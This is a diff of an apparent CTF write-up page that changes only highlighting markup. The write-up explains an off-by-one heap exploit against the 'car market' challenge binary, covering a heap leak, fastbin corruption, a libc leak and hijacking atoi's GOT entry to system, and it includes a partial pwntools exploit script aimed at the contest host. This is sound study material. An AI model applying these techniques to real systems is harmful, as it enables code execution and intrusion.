@@ -304,9 +304,9 @@
 
 <!-- more -->
 
-<p>64 bit ELF, with <strong>Partial RELRO, Canary &amp; NX enabled, no PIE</strong>. <code class="highlighter-rouge">libc.so</code> was provided.</p>
+<p>64 bit ELF, with <strong>Partial RELRO, Canary &amp; NX enabled, no PIE</strong>. <code class="language-plaintext highlighter-rouge">libc.so</code> was provided.</p>
 
-<p>The binary is a car market program. It will let us list our cars’ info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer’s name, comment and print out the customer’s info. The <code class="highlighter-rouge">car</code> and <code class="highlighter-rouge">customer</code> are defined as the following structures:</p>
+<p>The binary is a car market program. It will let us list our cars’ info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer’s name, comment and print out the customer’s info. The <code class="language-plaintext highlighter-rouge">car</code> and <code class="language-plaintext highlighter-rouge">customer</code> are defined as the following structures:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">car</span><span class="p">{</span>
   <span class="kt">char</span> <span class="n">model</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
   <span class="kt">long</span> <span class="n">price</span><span class="p">;</span>
@@ -316,16 +316,16 @@
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">customer</span><span class="p">{</span>
   <span class="kt">char</span> <span class="n">first_name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
   <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-  <span class="kt">char</span><span class="o">*</span> <span class="n">comment</span><span class="p">;</span> <span class="c1">// buffer size: 0x48
-</span><span class="p">};</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">comment</span><span class="p">;</span> <span class="c1">// buffer size: 0x48</span>
+<span class="p">};</span>
 </code></pre></div></div>
 
 <p>After doing some reversing &amp; fuzzing, here’s some important program behavior:</p>
 
 <ul>
-  <li>There’s a pointer <code class="highlighter-rouge">struct car** ptr</code>. The program will first use <code class="highlighter-rouge">malloc</code> to allocate a buffer and assigned to <code class="highlighter-rouge">ptr</code>, which use the buffer to store the <code class="highlighter-rouge">car*</code> array.</li>
-  <li>Each time we add a customer to a car, the program will first check if <code class="highlighter-rouge">car-&gt;customer</code> and <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code> were exist in the car. If it does, the program will free <code class="highlighter-rouge">car-&gt;customer</code> and <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code>, ensure that there’s only one customer in the car.</li>
-  <li>There exist multiple <strong>off-by-one</strong> vulnerabilities while the program try to read the user input. When we input the <code class="highlighter-rouge">model</code>, <code class="highlighter-rouge">first_name</code> and the <code class="highlighter-rouge">name</code> data, we can trigger the vulnerability by entering a long length data. <strong>This will cause the first byte of the next data be overwritten to a null byte.</strong></li>
+  <li>There’s a pointer <code class="language-plaintext highlighter-rouge">struct car** ptr</code>. The program will first use <code class="language-plaintext highlighter-rouge">malloc</code> to allocate a buffer and assigned to <code class="language-plaintext highlighter-rouge">ptr</code>, which use the buffer to store the <code class="language-plaintext highlighter-rouge">car*</code> array.</li>
+  <li>Each time we add a customer to a car, the program will first check if <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> and <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code> were exist in the car. If it does, the program will free <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> and <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code>, ensure that there’s only one customer in the car.</li>
+  <li>There exist multiple <strong>off-by-one</strong> vulnerabilities while the program try to read the user input. When we input the <code class="language-plaintext highlighter-rouge">model</code>, <code class="language-plaintext highlighter-rouge">first_name</code> and the <code class="language-plaintext highlighter-rouge">name</code> data, we can trigger the vulnerability by entering a long length data. <strong>This will cause the first byte of the next data be overwritten to a null byte.</strong></li>
 </ul>
 
 <p>The first thing I try to do is to leak some address. I found that if we do the following operation, we can leak heap’s base address:</p>
@@ -337,9 +337,9 @@
   <li>Print out the customer info, the customer’s first name will become a heap address</li>
 </ol>
 
-<p>This is because the program will try to free the memory of <code class="highlighter-rouge">car-&gt;customer</code> before we try to enter the customer menu for the second time. After <code class="highlighter-rouge">car-&gt;customer</code> was freed, its memory chunk’s fd (<strong>which is also <code class="highlighter-rouge">car-&gt;customer-&gt;first_name</code></strong>) will be storing the next free chunk’s address, so by printing out the customer’s info , we can leak out the heap’s address.</p>
+<p>This is because the program will try to free the memory of <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> before we try to enter the customer menu for the second time. After <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> was freed, its memory chunk’s fd (<strong>which is also <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;first_name</code></strong>) will be storing the next free chunk’s address, so by printing out the customer’s info , we can leak out the heap’s address.</p>
 
-<p>The next thing is to leak out the libc’s address. To achieve this, I decide to corrupted fastbin by exploiting the off-by-one vulnerability. Assume that we have the following memory layout of a <code class="highlighter-rouge">car-&gt;customer</code> structure:</p>
+<p>The next thing is to leak out the libc’s address. To achieve this, I decide to corrupted fastbin by exploiting the off-by-one vulnerability. Assume that we have the following memory layout of a <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> structure:</p>
 <pre>
              +------------------+
 customer     |........first_name| char first_name[32]
@@ -356,9 +356,9 @@ customer+64  |        0x12345680| char* comment
              +------------------+
 </pre>
 
-<p>By using the off-by-one vulnerability on <code class="highlighter-rouge">car-&gt;customer-&gt;name</code>, <strong>we can overwrite the last byte of <code class="highlighter-rouge">comment</code>’s address, change it from <code class="highlighter-rouge">0x12345680</code> to <code class="highlighter-rouge">0x12345600</code></strong>. Now if we exit &amp; re-enter the customer menu, the program will try to free <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code>, which is <code class="highlighter-rouge">0x12345600</code> instead of <code class="highlighter-rouge">0x12345680</code>.</p>
+<p>By using the off-by-one vulnerability on <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;name</code>, <strong>we can overwrite the last byte of <code class="language-plaintext highlighter-rouge">comment</code>’s address, change it from <code class="language-plaintext highlighter-rouge">0x12345680</code> to <code class="language-plaintext highlighter-rouge">0x12345600</code></strong>. Now if we exit &amp; re-enter the customer menu, the program will try to free <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code>, which is <code class="language-plaintext highlighter-rouge">0x12345600</code> instead of <code class="language-plaintext highlighter-rouge">0x12345680</code>.</p>
 
-<p>Now if we have the memory layout of a <code class="highlighter-rouge">car</code> structure like this:</p>
+<p>Now if we have the memory layout of a <code class="language-plaintext highlighter-rouge">car</code> structure like this:</p>
 <pre>  
                       +------------------+
     car    0x123455F0 |               0x0| char model[16]
@@ -371,39 +371,39 @@ customer+64  |        0x12345680| char* comment
                       +------------------+
 </pre>
 
-<p>By setting the model of the car, we can fake the chunk’s header, so when glibc’s freeing <code class="highlighter-rouge">0x12345600</code>, it will think that it is freeing a memory chunk with the size of <code class="highlighter-rouge">0x50</code>, <strong>the same size as <code class="highlighter-rouge">car-&gt;customer-&gt;comment</code></strong>, and add <code class="highlighter-rouge">0x12345600</code> into fastbin. This will create an <strong>Use-After-Free</strong> situation, with <code class="highlighter-rouge">0x12345600</code> being a dangling pointer. The next time we create a customer comment, the program will allocate <code class="highlighter-rouge">0x12345600</code> as the comment buffer, <strong>and thus we can modify the structure of <code class="highlighter-rouge">car</code>, changing the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">atoi</code>’s GOT</strong>. After that, we can leak <code class="highlighter-rouge">atoi</code>’s GOT by printing the <code class="highlighter-rouge">car</code>’s info.</p>
+<p>By setting the model of the car, we can fake the chunk’s header, so when glibc’s freeing <code class="language-plaintext highlighter-rouge">0x12345600</code>, it will think that it is freeing a memory chunk with the size of <code class="language-plaintext highlighter-rouge">0x50</code>, <strong>the same size as <code class="language-plaintext highlighter-rouge">car-&gt;customer-&gt;comment</code></strong>, and add <code class="language-plaintext highlighter-rouge">0x12345600</code> into fastbin. This will create an <strong>Use-After-Free</strong> situation, with <code class="language-plaintext highlighter-rouge">0x12345600</code> being a dangling pointer. The next time we create a customer comment, the program will allocate <code class="language-plaintext highlighter-rouge">0x12345600</code> as the comment buffer, <strong>and thus we can modify the structure of <code class="language-plaintext highlighter-rouge">car</code>, changing the <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> pointer to <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT</strong>. After that, we can leak <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT by printing the <code class="language-plaintext highlighter-rouge">car</code>’s info.</p>
 
 <p>To summarize, the following steps will help us leak out the libc’s address:</p>
 
 <ol>
-  <li>Add a couple of cars, try to make a <code class="highlighter-rouge">car</code>’s address ends with the <code class="highlighter-rouge">0xf0</code> byte (ex. <code class="highlighter-rouge">0x123455f0</code>), and put the fake chunk header in <code class="highlighter-rouge">car-&gt;model</code>.</li>
-  <li>Exploit the off-by-one vulnerability, overwrite a <code class="highlighter-rouge">comment</code>’s buffer address. (ex. <code class="highlighter-rouge">0x12345680</code> -&gt; <code class="highlighter-rouge">0x12345600</code>)</li>
-  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="highlighter-rouge">comment</code>’s address.</li>
-  <li>Create a new <code class="highlighter-rouge">comment</code>, the new <code class="highlighter-rouge">comment</code>’s buffer will be overlapped with one of those <code class="highlighter-rouge">car</code>’s memory chunk.</li>
-  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code>’s structure, change the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">atoi</code>’s GOT.</li>
-  <li>Print out the <code class="highlighter-rouge">car</code>’s info, leak <code class="highlighter-rouge">atoi</code>’s GOT and get the libc’s address.</li>
+  <li>Add a couple of cars, try to make a <code class="language-plaintext highlighter-rouge">car</code>’s address ends with the <code class="language-plaintext highlighter-rouge">0xf0</code> byte (ex. <code class="language-plaintext highlighter-rouge">0x123455f0</code>), and put the fake chunk header in <code class="language-plaintext highlighter-rouge">car-&gt;model</code>.</li>
+  <li>Exploit the off-by-one vulnerability, overwrite a <code class="language-plaintext highlighter-rouge">comment</code>’s buffer address. (ex. <code class="language-plaintext highlighter-rouge">0x12345680</code> -&gt; <code class="language-plaintext highlighter-rouge">0x12345600</code>)</li>
+  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="language-plaintext highlighter-rouge">comment</code>’s address.</li>
+  <li>Create a new <code class="language-plaintext highlighter-rouge">comment</code>, the new <code class="language-plaintext highlighter-rouge">comment</code>’s buffer will be overlapped with one of those <code class="language-plaintext highlighter-rouge">car</code>’s memory chunk.</li>
+  <li>Edit <code class="language-plaintext highlighter-rouge">comment</code> and modify the <code class="language-plaintext highlighter-rouge">car</code>’s structure, change the <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> pointer to <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT.</li>
+  <li>Print out the <code class="language-plaintext highlighter-rouge">car</code>’s info, leak <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT and get the libc’s address.</li>
 </ol>
 
-<p>Now we have the libc’s address. Since the GOT entries are writable, we can try to overwrite <code class="highlighter-rouge">atoi</code>’s GOT into <code class="highlighter-rouge">system</code>’s address and do the GOT hijacking. At first I try to overwrite the GOT by using the same method as I leak <code class="highlighter-rouge">atoi</code>’s GOT – after we change the <code class="highlighter-rouge">customer</code> pointer, we can overwrite the GOT entry by modifying <code class="highlighter-rouge">customer-&gt;first_name</code>.</p>
+<p>Now we have the libc’s address. Since the GOT entries are writable, we can try to overwrite <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT into <code class="language-plaintext highlighter-rouge">system</code>’s address and do the GOT hijacking. At first I try to overwrite the GOT by using the same method as I leak <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT – after we change the <code class="language-plaintext highlighter-rouge">customer</code> pointer, we can overwrite the GOT entry by modifying <code class="language-plaintext highlighter-rouge">customer-&gt;first_name</code>.</p>
 
-<p>Except we can’t. That’s because when we try to do so, the program will try to free <code class="highlighter-rouge">car-&gt;customer</code> before we enter the customer menu, <strong>and doing <code class="highlighter-rouge">free(atoi@got.plt)</code> will crash the program</strong>. We’ll have to find another way to overwrite the GOT. So how are we gonna do that? Well, <strong>remember the <code class="highlighter-rouge">ptr</code> variable?</strong> The pointer that points to the <code class="highlighter-rouge">car*</code> array?</p>
+<p>Except we can’t. That’s because when we try to do so, the program will try to free <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> before we enter the customer menu, <strong>and doing <code class="language-plaintext highlighter-rouge">free(atoi@got.plt)</code> will crash the program</strong>. We’ll have to find another way to overwrite the GOT. So how are we gonna do that? Well, <strong>remember the <code class="language-plaintext highlighter-rouge">ptr</code> variable?</strong> The pointer that points to the <code class="language-plaintext highlighter-rouge">car*</code> array?</p>
 
-<p>Since we can modify a <code class="highlighter-rouge">car</code>’s structure by editing the comment, we can once again modify <code class="highlighter-rouge">car-&gt;customer</code>, changing the pointer to <code class="highlighter-rouge">ptr</code>, so when the program free <code class="highlighter-rouge">car-&gt;customer</code>, <strong>it will free the whole <code class="highlighter-rouge">car*</code> array instead.</strong> When the next time we create a new comment, it will allocate the memory by splitting the memory chunk from <code class="highlighter-rouge">ptr</code>, <strong>making us able to control the <code class="highlighter-rouge">car*</code> array.</strong> We can then overwrite the <code class="highlighter-rouge">car</code> pointer into <code class="highlighter-rouge">atoi</code>’s GOT by editing the comment. Once the <code class="highlighter-rouge">car</code> pointer is changed, we can overwrite the content by setting <code class="highlighter-rouge">car-&gt;model</code>, and that’s how we hijack <code class="highlighter-rouge">atoi</code>’s GOT.</p>
+<p>Since we can modify a <code class="language-plaintext highlighter-rouge">car</code>’s structure by editing the comment, we can once again modify <code class="language-plaintext highlighter-rouge">car-&gt;customer</code>, changing the pointer to <code class="language-plaintext highlighter-rouge">ptr</code>, so when the program free <code class="language-plaintext highlighter-rouge">car-&gt;customer</code>, <strong>it will free the whole <code class="language-plaintext highlighter-rouge">car*</code> array instead.</strong> When the next time we create a new comment, it will allocate the memory by splitting the memory chunk from <code class="language-plaintext highlighter-rouge">ptr</code>, <strong>making us able to control the <code class="language-plaintext highlighter-rouge">car*</code> array.</strong> We can then overwrite the <code class="language-plaintext highlighter-rouge">car</code> pointer into <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT by editing the comment. Once the <code class="language-plaintext highlighter-rouge">car</code> pointer is changed, we can overwrite the content by setting <code class="language-plaintext highlighter-rouge">car-&gt;model</code>, and that’s how we hijack <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT.</p>
 
 <p>So after we leak the libc’s address:</p>
 
 <ol>
-  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code>’s structure, change the <code class="highlighter-rouge">car-&gt;customer</code> pointer to <code class="highlighter-rouge">ptr</code>.</li>
-  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="highlighter-rouge">car-&gt;customer</code>’s address.</li>
-  <li>Create a new <code class="highlighter-rouge">comment</code>, the new <code class="highlighter-rouge">comment</code>’s buffer will be overlapped with the <code class="highlighter-rouge">car*</code> array.</li>
-  <li>Edit <code class="highlighter-rouge">comment</code> and modify the <code class="highlighter-rouge">car</code> pointer, change it to <code class="highlighter-rouge">atoi</code>’s GOT.</li>
-  <li>Overwrite <code class="highlighter-rouge">atoi</code>’s GOT to <code class="highlighter-rouge">system</code>’s address by setting <code class="highlighter-rouge">car-&gt;model</code>.</li>
+  <li>Edit <code class="language-plaintext highlighter-rouge">comment</code> and modify the <code class="language-plaintext highlighter-rouge">car</code>’s structure, change the <code class="language-plaintext highlighter-rouge">car-&gt;customer</code> pointer to <code class="language-plaintext highlighter-rouge">ptr</code>.</li>
+  <li>Exit &amp; re-enter the customer menu, so the program will free the fake <code class="language-plaintext highlighter-rouge">car-&gt;customer</code>’s address.</li>
+  <li>Create a new <code class="language-plaintext highlighter-rouge">comment</code>, the new <code class="language-plaintext highlighter-rouge">comment</code>’s buffer will be overlapped with the <code class="language-plaintext highlighter-rouge">car*</code> array.</li>
+  <li>Edit <code class="language-plaintext highlighter-rouge">comment</code> and modify the <code class="language-plaintext highlighter-rouge">car</code> pointer, change it to <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT.</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">atoi</code>’s GOT to <code class="language-plaintext highlighter-rouge">system</code>’s address by setting <code class="language-plaintext highlighter-rouge">car-&gt;model</code>.</li>
 </ol>
 
-<p>At last, when the program ask us to input our choice, we can input <code class="highlighter-rouge">sh\x00</code> and execute <code class="highlighter-rouge">system('sh')</code>, spawning a shell and get the flag…right?</p>
+<p>At last, when the program ask us to input our choice, we can input <code class="language-plaintext highlighter-rouge">sh\x00</code> and execute <code class="language-plaintext highlighter-rouge">system('sh')</code>, spawning a shell and get the flag…right?</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -412,11 +412,11 @@ customer+64  |        0x12345680| char* comment
 <span class="n">HOST</span> <span class="o">=</span> <span class="s">"car-market.asis-ctf.ir"</span>
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./car_market"</span>
-<span class="c">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span>
-<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./car_libc.so.6"</span>
+<span class="c1">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
+</span><span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./car_libc.so.6"</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
@@ -439,19 +439,19 @@ customer+64  |        0x12345680| char* comment
         <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
         <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
     
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust mode</span>
-
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit cust mode
+</span>
 <span class="k">def</span> <span class="nf">leak_heap</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add cust</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c"># add com</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"123"</span><span class="p">)</span> <span class="c"># input com</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add cust</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit cust</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c"># list</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># add cust
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c1"># add com
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"123"</span><span class="p">)</span> <span class="c1"># input com
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit cust
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># add cust
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit cust
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span> <span class="c1"># list
+</span>    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Firstname : "</span><span class="p">)</span>
     <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0xb90</span>
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>
 
@@ -471,64 +471,64 @@ customer+64  |        0x12345680| char* comment
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    
+    <span class="c1">#r = process(ELF_PATH)
+</span>    
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">17</span><span class="p">):</span>
         <span class="n">model</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">"a"</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
         <span class="n">price</span> <span class="o">=</span> <span class="mi">100</span><span class="o">+</span><span class="n">i</span>
         <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add car: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
-        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">15</span><span class="p">:</span> <span class="c"># fake chunk</span>
-            <span class="n">model</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">15</span><span class="p">:</span> <span class="c1"># fake chunk
+</span>            <span class="n">model</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
             <span class="n">price</span> <span class="o">=</span> <span class="mh">0x1111</span>
         <span class="n">add_car</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">price</span><span class="p">)</span>
 
-    <span class="c"># leak heap base</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking heap base..."</span><span class="p">)</span>
+    <span class="c1"># leak heap base
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking heap base..."</span><span class="p">)</span>
     <span class="n">heap_base</span> <span class="o">=</span> <span class="n">leak_heap</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
 
-    <span class="c"># overflow one byte of heap address</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overflowing heap address..."</span><span class="p">)</span>
+    <span class="c1"># overflow one byte of heap address
+</span>    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overflowing heap address..."</span><span class="p">)</span>
     <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
     <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"comment"</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">33</span><span class="p">]</span>
     <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
     
-    <span class="c"># add comment and overwrite customer pointer, change it to atoi@got.plt</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for leaking got)..."</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># add customer</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c"># add comment</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c"># exit customer menu</span>
